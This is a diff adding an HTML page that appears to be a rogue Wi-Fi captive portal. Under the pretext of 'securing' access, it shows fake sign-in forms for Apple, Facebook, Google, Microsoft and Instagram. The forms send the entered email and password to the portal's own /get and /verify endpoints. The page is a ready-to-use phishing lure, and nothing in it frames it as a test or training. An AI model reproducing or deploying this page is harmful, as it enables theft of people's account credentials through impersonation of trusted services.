@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Wi-Fi Access Confirmation</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-image: linear-gradient(to right top, #051937, #004d7a, #008793, #00bf72, #a8eb12);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 900px;
+            width: 90%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            padding: 40px;
+            animation: fadeIn 2s ease-in-out;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        p.message {
+            text-align: center;
+            font-size: 18px;
+            line-height: 1.6;
+            margin-top: 10px;
+            margin-bottom: 30px;
+            color: #ffffff;
+            padding: 0 20px;
+        }
+
+        .auth-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .auth-button {
+            border: none;
+            padding: 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            font-size: 16px;
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            text-decoration: none;
+            background-size: 200% auto;
+            text-align: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .auth-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.25);
+        }
+
+        .auth-button i {
+            margin-right: 8px;
+        }
+
+        .apple { background-color: #5e5e5e; }
+        .facebook { background-color: #3b5998; }
+        .google { background-color: #dd4b39; }
+        .microsoft { background-color: #f65314; }
+        .instagram { background-color: #C13584; }
+
+        .login-container {
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+            margin-top: 20px;
+            display: none;
+            backdrop-filter: blur(5px);
+            color: #000; /* For better readability */
+        }
+
+        input[type="text"], input[type="password"], input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 15px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+            font-size: 14px;
+            color: #333;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus, input[type="email"]:focus {
+            border-color: #555;
+            outline: none;
+        }
+
+
+        button.submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
+            margin-top: 15px;
+        }
+
+        button.submit:hover {
+            background-color: #45a049;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 14px;
+            color: #ffffff;
+            margin-top: 40px;
+        }
+
+        .footer a {
+            color: #aad8ff;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: #fff;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.97); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Final Step to Enjoy Exclusive Wi-Fi</h1>
+        <p class="message">
+            Almost there! For your security, please confirm your identity using your preferred social network. This ensures a personalized and secure browsing experience.
+        </p>
+        <div class="auth-buttons">
+            <a href="#" class="auth-button apple" onclick="toggleAuth('apple')"><i class="fab fa-apple"></i> Apple</a>
+            <a href="#" class="auth-button facebook" onclick="toggleAuth('facebook')"><i class="fab fa-facebook-f"></i> Facebook</a>
+            <a href="#" class="auth-button google" onclick="toggleAuth('google')"><i class="fab fa-google"></i> Google</a>
+            <a href="#" class="auth-button microsoft" onclick="toggleAuth('microsoft')"><i class="fab fa-microsoft"></i> Microsoft</a>
+            <a href="#" class="auth-button instagram" onclick="toggleAuth('instagram')"><i class="fab fa-instagram"></i> Instagram</a>
+        </div>
+
+        <div id="apple-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="email" name="email" placeholder="Apple ID" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Apple">
+                <button type="submit" class="submit">Sign in</button>
+            </form>
+        </div>
+        <div id="facebook-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="text" name="email" placeholder="Facebook Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Facebook">
+                <button type="submit" class="submit">Sign in</button>
+            </form>
+        </div>
+        <div id="google-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="email" name="email" placeholder="Google Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Google">
+                <button type="submit" class="submit">Sign in</button>
+            </form>
+        </div>
+        <div id="microsoft-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="email" name="email" placeholder="Microsoft Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Microsoft">
+                <button type="submit" class="submit">Sign in</button>
+            </form>
+        </div>
+        <div id="instagram-login" class="login-container">
+            <form action="/verify" method="post">
+                <input type="text" name="instagram_username" placeholder="Instagram Username" required>
+
+                <input type="password" name="instagram_password" placeholder="Password" required>
+                <button type="submit" class="submit">Verify with Instagram</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>For more information, <a href="#">click here</a> to contact our support.</p>
+        </div>
+    </div>
+
+    <script>
+        function toggleAuth(service) {
+            document.querySelectorAll('.login-container').forEach(container => {
+                container.style.display = 'none';
+            });
+            const serviceContainer = document.getElementById(`${service}-login`);
+            if (serviceContainer) {
+                serviceContainer.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+
+</html>
